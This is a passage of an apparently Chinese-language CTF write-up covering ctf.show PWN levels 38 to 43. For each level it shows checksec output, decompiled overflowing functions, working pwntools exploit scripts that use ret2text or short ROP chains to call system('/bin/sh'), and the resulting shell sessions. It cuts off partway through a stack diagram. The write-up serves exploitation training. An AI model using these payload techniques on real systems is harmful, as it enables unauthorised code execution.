pwn</span><br></pre></td></tr></table></figure>

<h2 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h2><p>Hint：64位的 system(“&#x2F;bin&#x2F;sh”) 后门函数给你</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line"> $ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<p>64位程序，关闭了栈保护与PIE</p>
<p>将程序拖进64位IDA查看main函数跟进漏洞ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与上题一样，这里存在溢出点，也同样存在后门函数backdoor：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是与32位不同的是，这里需要考虑到堆栈平衡加上ret返回地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28140)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x40066D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(ret) + p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># system函数地址</span></span><br><span class="line">binsh_addr=<span class="number">0x40065B</span> </span><br><span class="line">pop_rdi=<span class="number">0x4007e3</span></span><br><span class="line">payload=cyclic(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 107</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system and <span class="string">&#x27;/bin/sh&#x27;</span>.There is a backdoor <span class="keyword">function</span></span><br><span class="line">    * *************************************</span><br><span class="line">Just easy ret2text&amp;&amp;64bit</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  pwn</span><br></pre></td></tr></table></figure>

<h2 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h2><p>Hint：32位的 system(); “&#x2F;bin&#x2F;sh”</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line">$ objdump -d ./pwn | grep system@plt</span><br><span class="line">080483a0 &lt;system@plt&gt;:</span><br><span class="line"> 804854f:	e8 4c fe ff ff       	call   80483a0 &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>

<p>32位程序，关闭了栈保护与PIE</p>
<p>IDA查看漏洞函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，漏洞点还是在这，但是我们需要的东西发生了改变，跟进hint函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;You find me?&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现有“&#x2F;bin&#x2F;sh”字符串，有system函数打，但是直接把程序的流程劫持到这并不能得到我们想要</p>
<p>的，我们需要进一步进行构造来进行获取shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br></pre></td></tr></table></figure>

<p>如上所示，我们构造的payload在先进行溢出后，填上system函数的地址，这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，使用 p32 函数将整数值0转换为4字节的字符串。这个字符串将作为 system 函数的第二个参数，用于提供一个指向空值的指针作为 system 函数的第二个参数。当然在这里使用其他任意4个字符进行覆盖也可以如‘aaaa’,’bbbb’等均可。 p32(bin_sh) : 这部分使用 p32 函数将 bin_sh 的地址转换为一个4字节的字符串。 bin_sh 通常是指向包含要执行的命令的字符串（如 &#x2F;bin&#x2F;sh ）的指针。该字符串将作为 system函数的第一个参数。</p>
<p>到此我们就手动构造出了一个system(“&#x2F;bin&#x2F;sh”)出来了，也就能获得我们所需要的shell了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:08048750 aBinSh          db &#x27;/bin/sh&#x27;,0          ; DATA XREF: hint+15↑o</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=<span class="number">0x08048750</span>  <span class="comment">#&quot;/bin/sh&quot;字符串地址（.rodata段）</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 192</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system and <span class="string">&#x27;/bin/sh&#x27;</span>,but they don<span class="string">&#x27;t work together</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">Just easy ret2text&amp;&amp;32bit</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag  exp.py  pwn</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h2><p>Hint：64位的 system(); “&#x2F;bin&#x2F;sh”</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<p>是64位程序，关闭了栈保护与PIE</p>
<p>这几题的漏洞点都几乎一样，唯一不同的就是慢慢的少了参数之类的，重复的内容就不再赘述了，</p>
<p>讲解关键的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hint：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;You find me?&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里与上一题一样，有system函数，有‘&#x2F;bin&#x2F;sh’字符串，但是不在一起，因此我们仍然需要手动进行构造payload</p>
<p>64位和32位不同，参数不是直接放在栈上，而是优先放在寄存器rdi,rsi,rdx,rcx,r8,r9。这几个寄存器放不下时才会考虑栈。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</span><br></pre></td></tr></table></figure>

<p>对每个部分进行逐步解释：</p>
<ol>
<li><p>‘a’*(0xA+8) : 这部分生成了一个由字符 ‘a’ 组成的字符串，长度为0xA+8。这是为了填充缓冲区，达到溢出栈帧的目的。</p>
</li>
<li><p>p64(pop_rdi) : 这部分使用 p64 函数将 pop_rdi 的地址转换为一个8字节的字符串。pop_rdi 指令用于将值从栈上弹出并存储到寄存器rdi中。在这个payload中，它用于准备传递给 system 函数的第一个参数。</p>
</li>
<li><p>p64(bin_sh) : 这部分使用 p64 函数将 bin_sh 的地址转换为一个8字节的字符串。 bin_sh 通常是指向包含要执行的命令的字符串（如 &#x2F;bin&#x2F;sh ）的指针。该字符串将作为 system 函数的第一个参数。</p>
</li>
<li><p>p64(ret) : 这部分使用 p64 函数将 ret 的地址转换为一个8字节的字符串。 ret 是一个返回指令，用于将程序控制权返回到栈上保存的地址。在这个payload中，它被用作一个间接跳转指令，用于绕过栈中的返回地址，以达到执行 system 函数的目的。</p>
</li>
<li><p>p64(system) : 这部分使用 p64 函数将 system 的函数地址转换为一个8字节的字符串。system 是一个函数指针，指向一个可以执行系统命令的函数。最终我们的目的就是通过栈溢出修改返回地址，以控制程序执行流程。它通过调用 pop_rdi 指令将bin_sh 的地址加载到寄存器rdi中，然后通过 ret 指令进行间接跳转，最终调用 system 函数，以执行system(“&#x2F;bin&#x2F;sh”)进而获得一个我们想要的shell。</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init:00000000004004FE                 retn</span><br><span class="line">.rodata:0000000000400808 s               db &#x27;/bin/sh&#x27;,0          ; DATA XREF: hint+4↑o</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x4007E3</span></span><br><span class="line">bin_sh=<span class="number">0x400808</span></span><br><span class="line">ret=<span class="number">0x4004FE</span></span><br><span class="line">payload=cyclic(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 239</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system and <span class="string">&#x27;/bin/sh&#x27;</span>,but they don<span class="string">&#x27;t work together</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">Just easy ret2text&amp;&amp;64bit</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag  exp.py  pwn</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn41"><a href="#pwn41" class="headerlink" title="pwn41"></a>pwn41</h2><p>Hint：32位的 system(); 但是没”&#x2F;bin&#x2F;sh” ，好像有其他的可以替代</p>
<p>与上面一样，只不过这次出现的不是“&#x2F;bin&#x2F;sh”字符串，题目提示让我们找到一个字符串来进行替代它，通过对前面的学习，我们知道可以使用”sh”来进行替代“&#x2F;bin&#x2F;sh</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">useful</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么它两有什么区别呢？</p>
<ol>
<li><p>system(“&#x2F;bin&#x2F;sh”) ：</p>
<ul>
<li>在Linux和类Unix系统中， &#x2F;bin&#x2F;sh 通常是一个符号链接，指向系统默认的shell程序（如Bash或Shell）。因此，使用 system(“&#x2F;bin&#x2F;sh”) 会启动指定的shell程序，并在新的子进程中执行。</li>
<li>这种方式可以确保使用系统默认的shell程序执行命令，因为 &#x2F;bin&#x2F;sh 链接通常指向默认shell的可执行件。</li>
</ul>
</li>
<li><p>system(“sh”) ：</p>
<ul>
<li>使用 system(“sh”) 会直接启动一个名为 sh 的shell程序，并在新的子进程中执行。</li>
<li>这种方式假设系统的环境变量 $PATH 已经配置了能够找到 sh 可执行文件的路径，否则可能会导致找不到 sh 而执行失败。</li>
</ul>
</li>
</ol>
<p>总结来说， system(“&#x2F;bin&#x2F;sh”) 是直接指定了系统默认的shell程序路径来执行命令，而system(“sh”) 则依赖系统的环境变量 $PATH 来查找 sh 可执行文件并执行。如果系统的环境变量设置正确，这两种方式是等效的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:080487BA aSh             db &#x27;sh&#x27;,0               ; DATA XREF: useful+14↑o</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=<span class="number">0x080487BA</span></span><br><span class="line">payload=cyclic(<span class="number">0x12</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 263</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system ,but don<span class="string">&#x27;t have &#x27;</span>/bin/sh<span class="string">&#x27;.Find something to replace it!</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag  exp.py  pwn</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn42"><a href="#pwn42" class="headerlink" title="pwn42"></a>pwn42</h2><p>Hint：64位的 system(); 但是没”&#x2F;bin&#x2F;sh” ，好像有其他的可以替代</p>
<p>同上，也仅仅是64位与32位的区别</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x0000000000400843 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init:000000000040053E                 retn</span><br><span class="line">.rodata:0000000000400872 format          db &#x27;sh&#x27;,0               ; DATA XREF: useful+4↑o</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400843</span></span><br><span class="line">ret=<span class="number">0x40053E</span></span><br><span class="line">sh=<span class="number">0x400872</span></span><br><span class="line">payload=cyclic(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(sh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 286</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system ,but don<span class="string">&#x27;t have &#x27;</span>/bin/sh<span class="string">&#x27;.Find something to replace it!</span></span><br><span class="line"><span class="string">    * *************************************</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag  exp.py  pwn</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h2><p>Hint：32位的 system(); 但是好像没”&#x2F;bin&#x2F;sh” 上面的办法不行了，想想办法</p>
<p>这题又有所不同了，存在system函数，但是没有了参数供我们使用，需要我们自己去进行构造。我们一步步的开始学习新东西</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop ebx ; ret&quot;</span></span><br><span class="line">0x08048409 : pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>可以看到是32位程序，关闭栈保护和PIE保护的</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，简单查看各个函数后跟进漏洞函数ctfshow：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">time_t</span> seed; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  v3 = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == v2 )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;where is shell?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次有变化了，这次是用gets函数进行读入数据，它可以无限读取，不会判断上限，可以包含空格，以回车结束读取。所以这里就存在了明显的溢出</p>
<p>同时我们可以看到程序中已有system函数，那么我们只需要去找到它的参数，但是遗憾的是并没有找到</p>
<p>但是我们可以注意bss段有一个buf2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804B060                 public buf2</span><br><span class="line">.bss:0804B060 buf2            db    ? ;</span><br></pre></td></tr></table></figure>

<p>那么我们向程序中 bss 段的 buf2 处写入 “&#x2F;bin&#x2F;sh” 字符串，并将其地址作为 system 的参数传入。</p>
<p>我们可以构造如下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system)</span><br><span class="line">+ <span class="string">&#x27;aaaa&#x27;</span> + p32(buf2)</span><br></pre></td></tr></table></figure>

<p>我们逐步解释此payload：</p>
<ol>
<li><p>cyclic(0x6c+4) : 这部分使用pwntools库中的 cyclic 函数生成一个循环模式的字符串，长度为0x6c+4。循环模式字符串用于进行调试和定位溢出点。当然这里你也可以继续使用 b’a’*(0x6c+4)也是没有问题的。</p>
</li>
<li><p>p32(gets) : 这部分使用pwntools的 p32 函数将 gets 函数的地址转换为一个4字节的字符串。它用于将 gets 函数的地址作为返回地址覆盖到栈上。使程序在溢出时调用 gets 函数。</p>
</li>
<li><p>p32(pop_ebx) : 这部分使用 p32 函数将 pop_ebx 的地址转换为一个4字节的字符串。pop_ebx 是一个指令序列，用于将栈上的值弹出并存储到寄存器ebx中。(清理栈)</p>
</li>
<li><p>p32(buf2) : 这部分使用 p32 函数将 buf2 的地址转换为一个4字节的字符串。 buf2 是一个指向存储输入数据的缓冲区的指针。</p>
</li>
<li><p>p32(system) : 这部分使用 p32 函数将 system 函数的地址转换为一个4字节的字符串。它将用于将 system 函数的地址作为返回地址覆盖到栈上。</p>
</li>
<li><p>‘aaaa’ : 这部分是一个4字节的字符串，用于填充栈上的返回地址的剩余空间。【可以写成p32(0)]</p>
</li>
<li><p>p32(buf2) : 这部分使用 p32 函数将 buf2 的地址转换为一个4字节的字符串。它作为pop_ebx 指令的参数，用于将 buf2 的地址加载到寄存器ebx中。</p>
</li>
</ol>
<p>这个payload的目的是通过栈溢出漏洞控制程序的执行流程。它通过覆盖返回地址，将 gets 函数的地址作为返回地址覆盖到栈上。然后使用 pop_ebx 指令将 buf2 的地址加载到寄存器ebx中，最后覆盖返回地址为 system 函数的地址。通过这样的方式，可以执行 system(buf2) 来执行 buf2 指向的字符串所表示的系统命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 栈布局（高地址 → 低地址）</span><br><span class="line">+-------------------+  ← 初始栈顶（溢出前）</span><br><span class="line">|       ...         |  其他栈数据</span><br><span class="line">+-------------------+</span><br><span class="line">|   s[103] (局部)   |  ctfshow函数的局部数组s[104]</span><br><span class="line">|   s[102] (局部)   |  偏移：ebp-0x6C 到 ebp-0x1</span><br><span class="line">|       ...         |</span><br><span class="line">|   s[0] (局部)     |</span><br><span class="line">+-------------------+  ← ebp-0x6C（s的起始地址）</span><br><span class="line">|      ebp值        |  旧基址指针（4字节），偏移：ebp</span><br><span class="line">+-------------------+  ← 返回地址（溢出目标）</span><br><span class="line">|  gets函数地址     |  [溢出覆盖] 第一步：跳转到gets函数</span><br><span class="line">+-------------------+  ← gets执行完后返回的地址</span><br><span class="line">|  pop_ebx地址      |  [溢出覆盖] 第二步：执行pop ebx; ret</span><br><span class="line">+-------------------+  ← pop_ebx的参数（gets的参数）</span><br><span class="line">|  buf2地址(0x804B060)| [溢出覆盖] 往buf2写入&quot;/bin/sh&quot;(告诉gets将输入写入到buf2地址)</span><br><span class="line">+-------------------+  ← pop_ebx执行完后返回的地址</span><br><span class="line">|  system函数地址   |  [溢出覆盖] 第三步：跳转到system函数</span><br><span 